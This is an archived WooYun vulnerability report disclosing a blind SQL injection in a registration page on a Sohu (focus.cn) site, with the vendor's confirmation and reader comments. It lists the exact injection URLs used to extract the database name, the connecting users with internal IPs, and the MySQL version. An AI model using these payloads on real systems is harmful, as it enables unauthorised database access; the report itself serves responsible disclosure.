{"id": 3242, "wybug_id": "wooyun-2014-060817", "wybug_title": "搜狐某站点用户注册处存在SQL盲注漏洞", "wybug_corp": "搜狐", "wybug_author": "梧桐雨", "wybug_date": "2014-05-15 11:27", "wybug_open_date": "2014-06-29 11:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向公众公开  简要描述： 手工盲注是要吐血的。。 详细说明：  http://home.focus.cn/存在注入站点如上存在注入链接http://home.focus.cn/common/modules/spk/reg.php?id=628正常访问：http://home.focus.cn/common/modules/spk/reg.php?id=628返回：\n\n加单引号之后：http://home.focus.cn/common/modules/spk/reg.php?id=628'\n\nhttp://home.focus.cn/common/modules/spk/reg.php?id=628 and 1=1http://home.focus.cn/common/modules/spk/reg.php?id=628 and 1=2返回不一样，虽然没有报错但是可以肯定是一个盲注点。而且还是一个数字类型的盲注。   漏洞证明：  判断database()长度http://home.focus.cn/common/modules/spk/reg.php?id=628 and (length(database())=6) and 1=1得到结果是6进一步猜测http://home.focus.cn/common/modules/spk/reg.php?id=628 and (select ascii(substring(database(),1,1)) = 98) and 1=1返回错误http://home.focus.cn/common/modules/spk/reg.php?id=628 and (select ascii(substring(database(),1,1)) = 99) and 1=1返回正常，说明第一个字母是c以此类推可猜测出数据库名为：common猜user()http://home.focus.cn/common/modules/spk/reg.php?id=628 and (select ascii(substring(user(),1,1)) = 102) and 1=1http://home.focus.cn/common/modules/spk/reg.php?id=628 and (select ascii(substring(user(),2,1)) = 100) and 1=1http://home.focus.cn/common/modules/spk/reg.php?id=628 and (select ascii(substring(user(),3,1)) = 98) and 1=1以此类推，得到fdbuser@10.11.8.2fdbuser@10.10.80.82这里有个小技巧，猜解出现了2个user，应该是连接数据库用户有2个，所以得到结果不一。一般盲注到这里不用怀疑，肯定是2个user了。猜测version版本，得mysql5.0   修复方案：  过滤参数id   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-15 11:38 厂商回复： 感谢支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-15 13:05 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  膜拜梧桐雨大牛，你的名字像元朝某个作品的名字！    \n     2014-05-16 06:36 |    \t\tLonely \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:27        | 人生如梦,始终都游不过当局者迷的悲哀。)\t\t \n  看到是 梧桐雨 我就衮进来了。    \n     2014-07-03 16:10 |    \t\t乌云一哥 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:1        | echo file_get_contents('http://www.wooyu...)\t\t \n  看到是 梧桐雨 我就衮进来了。    \n     2014-07-03 16:23 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @乌云一哥 师傅球不黑    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}